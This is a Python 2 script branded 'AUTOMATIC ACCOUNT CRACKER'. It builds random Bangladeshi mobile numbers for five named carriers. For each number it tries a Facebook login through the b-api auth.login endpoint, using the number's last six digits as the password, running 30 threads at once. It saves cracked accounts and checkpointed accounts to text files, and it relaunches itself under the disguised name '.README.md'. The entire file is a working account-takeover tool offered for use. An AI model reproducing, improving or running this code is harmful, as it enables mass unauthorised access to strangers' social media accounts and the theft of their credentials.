# Decompiled By Mansoor Nabi Zada 
#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(99269):

    nmbr = random.randint(111111, 999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
		
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo='''
\033[1;91m  ____ ____ _____  __
\033[1;92m | __ ) ___|_ _\ \/ /
\033[1;91m |  _ \___ \| | \  / 
\033[1;92m | |_) |__) | | /  \ 
\033[1;91m |____/____/___/_/\_\  
\033[1;96m -------------------------
\033[1;32m B  O  T  O  L  B  A  B  A
\033[1;96m -------------------------                                                  
\033[1;93m        AUTOMATIC ACCOUNT CRACKER BY \033[1;96mBOTOL BABA
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : Mansoor Nabi Zada 
\033[1;32m
--------------------------------------------------
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print("ONLY 06 DIGITS HACKABLE ACCOUNTS ARE AVAILABLE")
	print
	jalan("\033[1;91m[1]  \033[1;96mGRAMEENPHONE")
	jalan("\033[1;92m[2]  \033[1;93mROBI")
	jalan("\033[1;90m[3]  \033[1;96mAIRTEL")
	jalan("\033[1;94m[4]  \033[1;92mBANGLALINK")
	jalan("\033[1;95m[5]  \033[1;96mTELETALK")
	print
	jalan("\033[1;90m[11] 11 DIGIT CRACKER")
	jalan("\033[1;90m[12] 7 DIGIT CRACKER")
	jalan("\033[1;90m[13] 8 DIGIT CRACKER")
	print
	jalan("\033[1;92m[20] UPDATE THIS TOOL")
	jalan("\033[1;92m[21] FOLLOW ME ON FACEBOOK")
	jalan("\033[1;92m[22] JOIN OUR ETHICAL HACKERS GROUP")
	print
#	print '[3] Follow Me On Facebook'
	jalan("\033[1;97m[00]  EXIT")
	print 50*'-'
	action()


def action():
	bch = raw_input('\n  ===>   ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print
		try:
			c = raw_input(" TYPE ANY 2 DIGIT NUMBER :  ")
			k="+88017"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":
		os.system("clear")
		print (logo)
		print
		try:
			c = raw_input(" TYPE ANY 2 DIGIT NUMBER :  ")
			k="+88018"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":
		os.system("clear")
		print (logo)
		print
		try:
			c = raw_input(" TYPE ANY 2 DIGIT NUMBER :  ")
			k="+88016"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="4":
		os.system("clear")
		print (logo)
		print
		try:
			c = raw_input(" TYPE ANY 2 DIGIT NUMBER :  ")
			k="+88019"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="5":
		os.system("clear")
		print (logo)
		print
		try:
			c = raw_input(" TYPE ANY 2 DIGIT NUMBER :  ")
			k="+88015"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =='11':
	    os.system('xdg-open https://bit.do/botolninedigit')
	    time.sleep(1)
  	    menu()
	elif bch =='12':
	    os.system('xdg-open https://youtu.be/McahDH7uuV8')
	    time.sleep(1)
  	    menu()
	elif bch =='21':
	    os.system('xdg-open https://facebook.com/mehedihasanariyan2')
	    time.sleep(1)
  	    menu()
	elif bch =='13':
	    os.system('xdg-open https://bit.do/botoleightdigit')
	    time.sleep(1)
  	    menu()
	elif bch =='14':
	    os.system('xdg-open https://bit.do/botolninedigit')
	    time.sleep(1)
  	    menu()
	elif bch =='22':
	    os.system('xdg-open https://www.facebook.com/groups/231747098048450')
	    time.sleep(1)
  	    menu()
	elif bch =="20":
	    os.system("clear")
	    os.system("pip2 install --upgrade bhottwo")
	    os.system("pip2 install --upgrade bhottwo")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .README.md")
#	elif chb =='3':
#	    os.system('xdg-open https://www.facebook.com/themehtan')
#	    time.sleep(1)
#	    menu()
	elif bch =='00':
		exb()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	psb ('[✓] TOTAL NUMBERS: '+xxx)
	time.sleep(0.5)
	psb ('[✓] PLEASE WAIT, PROCESS IS RUNNING ...')
	time.sleep(0.5)
	psb ('[!] TO STOP THIS PROCESS PRESS Ctrl THEN z')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '[LOGIN AFTER 72 HRS] ' + k + c + user + ' | ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
#				else:
#				    pass2="123456"
#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
#				    q = json.load(data)
#				    if 'access_token' in q:
#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass2+'\n'+"\n"
#				        okb = open('save/successfull.txt', 'a')
#				        okb.write(k+c+user+'|'+pass2+'\n')
#				        okb.close()
#				        oks.append(c+user+pass2)
#				    else:
#				        if 'www.facebook.com' in q['error_msg']:
#					        print '[Checkpoint] ' + k + c + user + ' | ' + pass2+'\n'
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'|'+pass2+'\n')
#					        cps.close()
#					        cpb.append(c+user+pass2)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()



